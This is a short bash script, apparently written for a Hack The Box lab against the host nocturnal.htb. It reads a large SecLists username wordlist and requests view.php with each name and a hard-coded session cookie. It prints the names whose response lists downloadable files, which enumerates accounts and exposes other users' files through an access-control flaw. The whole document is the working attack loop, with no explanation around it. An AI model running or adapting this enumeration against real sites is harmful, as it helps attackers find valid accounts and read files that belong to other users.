#!/bin/bash

file="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
cookie="PHPSESSID=87hfknuq6jgscrgd4e2rgc7prn"

# Loop through each username
while IFS= read -r username; do
    # Corrected line: Double-quote the URL string
    response=$(curl -s "http://nocturnal.htb/view.php?username=$username&file=1.pdf" --cookie "$cookie" | grep "Available files for download:")
    
    if [ -n "$response" ]; then
        echo "[+] $username"
    fi
done < "$file"